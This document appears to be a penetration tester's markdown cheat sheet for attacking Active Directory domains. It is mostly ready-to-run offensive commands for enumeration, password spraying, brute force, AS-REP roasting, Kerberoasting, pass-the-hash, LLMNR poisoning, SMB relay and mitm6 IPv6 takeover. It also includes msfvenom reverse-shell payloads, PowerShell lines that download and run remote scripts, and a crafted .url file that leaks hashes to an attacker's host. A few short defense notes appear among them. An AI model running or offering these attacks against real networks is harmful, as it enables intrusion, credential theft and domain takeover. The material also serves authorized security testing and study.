An Active Directory environment has a very critical dependency on a Domain Name System (DNS) service.

A typical domain controller in an AD will also host a DNS server that is authoritative for a given domain.

An attack against Active Directory infrastructure begins with an exploit or client-side attack against a domain workstation or server followed by enumeration of the AD environment.

## Main concepts of Active Directory:
- Directory – Contains all the information about the objects of the Active directory
- Object – An object references almost anything inside the directory (a user, group, shared folder...)
- Domain – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can exist and each of them will have their own objects collection.
- Tree – Group of domains with the same root. Example: dom.local, email.dom.local, www.dom.local
- Forest – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.

### Attacking Active Directory

- [password cracking](/password_cracking/README.md)
- [Adam Toscher - Top 5 ways](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
- [Enum AD infra](https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78)
- [Automate AD enum](https://infosecwriteups.com/automating-ad-enumeration-with-frameworks-f8c7449563be)
- [kerberoasting](https://medium.com/@Shorty420/kerberoasting-9108477279cc)



#### Network scan
```
nmap -script='broadcast-dhcp-discover'
Nbtscan $subnet
```

#### DNS scan
```
Dig -t SRV _gc._tcp.<domain fqdn>

Dig -t SRV _ldap._tcp.<domain fqdn>

Dig -t SRV _kerberos._tcp.<domain fqdn>

Dig -t SRV _kpasswd._tcp.<endpoint fqdn>

­nmap —script dns-srv-enum –script-args “dns-srv-enum.domain=’<domain fqdn>’”

nmap -sT -Pn -n --open -p389 -script='ldap-rootdse'


nslookup \
    server $IP
    127.0.0.1
    127.0.0.2
    hostname
    $IP

```
### start off testing null authentication with smbclient, smbmap, rpcclient

> looking to foothold, find shares, grab user and group information

```
smbclient -U "" -L \\\\$IP
smbclient -L
smbmap -u "" -H $IP
rpcclient -U "" -N $IP
GetADUsers.py -all -dc-ip $IP domain.local/username
crackmapexec smb --shares
rpcclient -U '' $IP --no-pass
    enumdomusers
    queryusergroups $username

```

#### Interesting files on shares
- Group Policy Preferences (GPP) was introduced in Windows Server 2008, and among many other features, allowed administrators to modify users and groups across their network.)
    - Groups.xml


#### LDAP [decent attack surface]
```
ldapsearch -h $IP
ldapsearch -h $IP -x # simple auth
ldapsearch -h $IP -D USER' -w 'PASS' -x -b "DC=box,DC=local" '(objectclass=user)'
ldapsearch -h $IP -x -s base namingcontexts # scope
ldapsearch -h $IP -x -b "DC=corporate,DC=local" > ldap.out
ldapsearch -h $IP -x -b "DC=Box,DC=local" '(ObjectClass=user)' > people.out
ldapsearch -h $IP -x -b "DC=Box,DC=local" '(ObjectClass=user)' | grep -i userPrincipalName | awk -F ':' '{print $2}' > useremailadds.ldap
ldapsearch -h $IP -x -b "DC=Box,DC=local" '(ObjectClass=Person)' | grep -i sAMAccountName: | awk -F ':' '{print $2}' > users.ldap
ldapsearch -x -h $(cat ip) -p 389 -D 'USER' -w 'PASS' -b "DC=box,DC=local" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" > users_people.ldap
ldapsearch -x -h $(cat ip) -p 389 -D  'user' -w 'pass' -b "dc=box,dc=local" -s sub "(&(objectCategory=person)(objectClass=user)(serviceprincipalname=*/*))" servicePrincipalName | grep -B 1 servicePrincipalName


```

#### URL Attack
> Save file @generalfile.url [The @ places at top of folder]

```
[InternetShortcut]
URL=helloworld
WorkingDirectory=helloworld
IconFile=\\MYIP\%USERNAME%.icon
IconIndex=1
```


#### Password spray from LDAP / RPC findings
[simple pass.list](/wordlists/simple.txt)

```
# create password.list
for i in $(cat pass.list); do echo $i, echo $i2022, echo $i2021; echo $i!; done > tmp && cat tmp > pass.list
hashcat --force --stdout pass.list -r /usr/share/hashcat/rules/best64.rule | awk 'length {$0} > 8'
hashcat --force --stdout pass.list -r /usr/share/hashcat/rules/toggles1.rule | awk 'length {$0} > 8'
cat pass.list | sed '/^$/d' > tmp && cat tmp > pass.list

```

#### crackmapexec password policy
    - enum4linux for groups, password policies etc
```
crackmapexec smb $IP -u "" -p "" --pass-pol # anonymous users in precompatiblity group in domains upgraded since 2003/2008
```

#### crackmapexec bruteforce
```
crackmapexec smb $IP -u userlist -p passwordlist

```

#### with user list - GetNPUsers.py
```
sudo python GetNPUsers.py domain.local/ -dc-ip $IP -request -usersfile /home/users.txt
```

#### with creds - SMB & Evil-WinRM
```
evil-winrm -u username -p password -i $IP
```

#### bruteforce with hydra
```
hydra -L /home/users.txt -p password smb://$IP
```


#### [kerbrute](https://github.com/TarlogicSecurity/kerbrute) bruteforce
```
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

#### [Rubeus](https://github.com/Zer1t0/Rubeus) bruteforce
```
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```


#### ASREPRoast with [impacket](https://github.com/SecureAuthCorp/impacket)
```
cp /usr/share/doc/python3-impacket/examples/GetNPUsers.py . # Users that do not require kerberos preauth
sudo python3 GetNPUsers.py box.local/ -dc-ip $(cat ip) -usersfile userlist.smb -format john -outputfile hashes.getnpusers

```

#### hash cracking
```
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
hashcat -m 13100 -a 0 hash.krb wordlists/rockyou2021.txt --force --potfile-disable
hashcat -m 7500 hash.txt -D 2 -o result_hash.txt -O -w 3 -a 3 wordlists/rockyou2021.txt
john --wordlist=<passwords_file> <AS_REP_responses_file>
john --format:krb5tgs hash.krb --wordlist=/usr/share/wordlists/rockyou.txt

```

#### Kerberoast
```
# impacket
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
sudo python3 GetUserSPNs.py box.local/owned_user -dc-ip $IP -request

# powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

# Rubeus

.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>

```

#### [Over pass the hash](https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/)
```
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>

# Request the TGT with aesKey (more secure encryption & stealth)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>

# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]


# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

# OR with Rubeus and PSExec

# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd

```

#### Note: consider group policy password grabs and cracks GPPDecrypt / Powerup / Empire
#### Note: Clock skew too great error ;
```
date -s <new:time:required>
```

#### login with crackmapexec
```
crackmapexec smb $IP -u owned_user -p cracked_hash --shares
```

#### login with evil-winrm (from nmap all ports -p 5985)

```
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
evil-winrm -u owned_user -p cracked_hash -i $IP
```

## login with wmiexec.py
```
python3 wmiexec.py box.local/administrator:password@$IP
```

#### add attack machine to local DNS
```
sudo python3 dnstool.py -u box.local\username -p password -r webdanko.box.local -a add -t A -d $IP_attacker $IP_victim
```

#### get standard revshell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o reverse.exe # stageless
msfvenom -p windows/x64/reverse_tcp LHOST=$IP LPORT=443 -f exe -o reverse.exe # staged
```

- transfer options
    - python -m SimpleHTTPServer + certutil -urlcache -split -f
    - upload via evil-winrm
    - impacket-smbserver sharename $(pwd) -smb2support -user me -password mypass
    - IEX(New-Object Net.WebClient).downloadString('http://$myIP/filetograb.ps1')

#### on target machine powershell
```
$pass = convertto-securestring 'df' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('df',$pass)
New-PSDrive -Name 'm' -PSProvider FileSystem -Credential $cred -Root \\$MyIP\Sharename
```

#### LLMNR Poisoning
- Link Local multicast name resoluton
- NETBIOS / DNS
- MITM Type Attack - We respond to the request
- The issue is that username and hash are given with correct response
- Tools
    - Impacket / Responder [Start before nmap and nessus scan]

##### LLMNR Poisoning Defense
- Turn off Multicast name resolution
```
[Local Computer Policy  / Computer Config / Admin Templatesd / Network / DNS Client]
```
- Disable NBT-NS
```
[Network Adapter Properties / TCP Properties / Advanced / Wins / Disable Netbios over TCP/IP ]
```
    Else:
        - Require Network Access Control
        - Strong Passwords



#### Capture NTMLv2 hashes with Responder
```bash
sudo responder -I eth0 -dw
```

#### SMB Relay Attacks
Instead of cracking hashes, relay credentials instead
- SMB signing needs to be off
- Relayed creds must be admin on machine


```bash
/etc/responder/Responder.conf # SMB = Off / HTTP = Off
python ntlmrelayx.py -ft targets.txt -smb2support
```

> SAM Hashes
Local user hashes / Windows version of ```/etc/passwd``` for local users

#### Discovering Hosts with SMB signing disabled
> Defaults

- Local machines = Off
- Servers = On

> Find via

- nessus scan
- nmap

```bash
sudo nmap --script=smb2-security-mode -p 445 192.168.131.0/24
```

#### Gaining Shell

```
sudo responder -I eth0 -dw
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
sudo nc 127.0.0.1 11000
```

```bash
msfconsole/windows/smb/psexec
    execute -f cmd.exe -i -H

```

### Mitigation
- Enable SMB signing
- Disable NTLM auth
- limit domain / local admins
- LDAP relay
- MiTM6
- difficult to detect

#### IPv6 DNS Takeover

- More reliable
- Probable IPv6 DNS hole
- Authentication to DC via LDAP
- [mitm6:](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [Combining NTLM Relays and Kerberos Delegation:](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

```bash
ntlmrelayx.py -6 -t ldaps://192.168.131.131 -wh fakewpad.basejump.local -l lootme

sudo git clone https://github.com/dirkjanm/mitm6 /opt/mitm6
sudo python3 mitm6.py -d basejump.local

sudo ntlmrelayx.py -6 -t ldaps://192.168.131.131 -wh fakewpad.basejump.local -l lootme

sudo python3 mitm6.py -d basejump.local
```
> Output
```
[*] Adding new user with username: YLzmriDGhj and password: ,JtM/MDi:z1G+OO result: OK
[*] Querying domain security descriptor
[*] Success! User YLzmriDGhj now has Replication-Get-Changes-All privileges on the domain

```

#### IPv6 Attack Defenses

- Disable WPAD WinHttpAutoProxySvc service
- LDAP signing / LDAPS channel binding
- Block Admin Delegation


#### Passback attack
Looking for access to LDAP / SMB / SMTP / Other connections of peripherials

- [Passback attack](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)
- MFPs = Multi-Function Peripherials [printers]
- Management Pages - LDAP Server = $(AttackingIP)

### Other vectors & approaches

- Start with MitM6 or Responder
- Nessus & nmap scan
    - SMB signing not active
- Run scans and generate traffic
- Listen for clear text creds on other systems
    - phone systems
    - Copier scanner
- Look for Websites [metasploit / http_version]
- Default Logins
    - Printers [scan to computer with admin rights]
    - Work flow applications
- Find unique / unusual methods in
